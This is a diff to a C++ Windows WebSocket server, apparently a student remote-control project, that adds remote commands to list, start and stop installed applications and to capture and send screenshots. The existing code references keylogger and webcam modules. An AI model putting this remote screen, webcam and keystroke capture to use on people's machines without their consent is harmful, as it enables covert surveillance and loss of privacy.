@@ -1,4 +1,4 @@
-// --- CAU HINH WINDOWS ---
+﻿// --- CAU HINH WINDOWS ---
 #ifndef _WIN32_WINNT
 #define _WIN32_WINNT 0x0A00 
 #endif
@@ -13,10 +13,13 @@
 #include <thread>
 #include <memory>
 #include <vector>
+#include<fstream>
 
 #include "Process.h"
 #include "Keylogger.h"
 #include "Webcam.h"
+#include"Application.h"
+#include"ScreenShot.h"
 
 // Tu dong link thu vien socket cua Windows
 #pragma comment(lib, "ws2_32.lib")
@@ -142,6 +145,7 @@ public:
             std::cout << "RECEIVED COMMAND: " << command << "\n";
             static Keylogger myKeylogger;
             static Process myProcessModule;
+            static Application myAppModule;
 
             // Xu ly lenh 
             // 1. Xu ly Shutdown
@@ -171,11 +175,11 @@ public:
                 if (!videoData.empty()) {
                     // Ma hoa Base64
                     std::string encoded = base64_encode(videoData);
-                    
+
                     // Gui ve Client voi tien to "file"
                     // De Client JS hieu va tai xuong
                     std::string response = "file " + encoded;
-                    
+
                     ws_.text(true);
                     ws_.write(net::buffer(response));
                     std::cout << "[SERVER] Video sent to Client.\n";
@@ -248,8 +252,131 @@ public:
                 ws_.text(true);
                 ws_.write(net::buffer("Server: " + result));
             }
+            // 6. Xu ly Application (List / Start / Stop)
 
-            // Lenh khong xac dinh
+            // 6.1. Liet ke cac ung dung da cai (doc tu Registry)
+            else if (command == "list-app")
+            {
+                // Load danh sach ung dung tu Registry
+                auto apps = myAppModule.LoadInstalledApplications();
+
+                ws_.text(true);
+
+                if (apps.empty())
+                {
+                    ws_.write(net::buffer("Server: Khong tim thay ung dung nao trong Registry."));
+                }
+                else
+                {
+                    std::string msg = "DANH SACH UNG DUNG DA CAI:\n";
+
+                    // Chi hien toi da 50 dong cho nhe
+                    size_t maxShow = std::min<std::size_t>(apps.size(), 50);
+
+                    for (size_t i = 0; i < maxShow; ++i)
+                    {
+                        const auto& app = apps[i];
+                        msg += "[" + std::to_string(i) + "] " + app.name + "\n";
+                        msg += "    Id:  " + app.id + "\n";
+                        msg += "    Exe: " + app.command + "\n\n";
+                    }
+
+                    if (apps.size() > maxShow)
+                    {
+                        msg += "... (" + std::to_string(apps.size() - maxShow)
+                            + " ung dung khac khong hien het)\n";
+                    }
+
+                    ws_.write(net::buffer(msg));
+                }
+            }
+
+            // 6.2. Start Application
+            // Lenh: "app-start <ten app hoac exe>"
+            else if (command.rfind("start-app ", 0) == 0)
+            {
+                const std::string prefix = "start-app ";
+                std::string input = command.substr(prefix.size()); // phan sau "app-start "
+
+                // Cap nhat danh sach ung dung (de StartApplicationFromInput biet cac DisplayName)
+                myAppModule.LoadInstalledApplications();
+
+                bool ok = myAppModule.StartApplicationFromInput(input);
+
+                ws_.text(true);
+                if (ok)
+                {
+                    ws_.write(net::buffer("Server: Da mo ung dung: " + input));
+                }
+                else
+                {
+                    ws_.write(net::buffer("Server: Khong the mo ung dung: " + input));
+                }
+            }
+
+            // 6.3. Stop Application
+            // Lenh: "app-stop <DisplayName>"
+            else if (command.rfind("stop-app ", 0) == 0)
+            {
+                const std::string prefix = "stop-app ";
+                std::string input = command.substr(prefix.size()); // phan sau "stop-app "
+
+                // Cap nhat danh sach ung dung moi nhat
+                myAppModule.LoadInstalledApplications();
+
+                bool ok = myAppModule.StopApplicationByName(input);
+
+                ws_.text(true);
+                if (ok)
+                {
+                    ws_.write(net::buffer(
+                        "Server: Da dung ung dung (hoac khong co process nao dang chay): " + input));
+                }
+                else
+                {
+                    ws_.write(net::buffer(
+                        "Server: Khong tim thay ung dung trong danh sach: " + input));
+                }
+            }
+            else if (command == "screenshot")
+            {
+                ws_.text(true);
+                ws_.write(net::buffer("Server: OK, capturing screenshot..."));
+
+                // Kích thước màn hình – phải trùng với bên ScreenShot.cpp
+                int width = GetSystemMetrics(SM_CXSCREEN);
+                int height = GetSystemMetrics(SM_CYSCREEN);
+
+                // Gọi hàm ScreenShot() trong ScreenShot.cpp
+                // Trả về buffer BGRA 32-bit: size = width * height * 4
+                std::vector<std::uint8_t> pixels = ScreenShot();
+
+                if (pixels.empty())
+                {
+                    ws_.text(true);
+                    ws_.write(net::buffer("Server: Error capturing screenshot."));
+                }
+                else
+                {
+                    // Đổi sang vector<char> để dùng lại base64_encode(const std::vector<char>&)
+                    std::vector<char> bytes(pixels.begin(), pixels.end());
+                    std::string encoded = base64_encode(bytes);
+
+                    // Gửi cho client:
+                    //  screenshot <w> <h> <base64_raw_bgra>
+                    std::string response =
+                        "screenshot " +
+                        std::to_string(width) + " " +
+                        std::to_string(height) + " " +
+                        encoded;
+
+                    ws_.text(true);
+                    ws_.write(net::buffer(response));
+
+                    std::cout << "[SERVER] Screenshot (" << width << "x" << height
+                        << ") sent to Client.\n";
+                }
+            }
             else
             {
                 ws_.text(true);
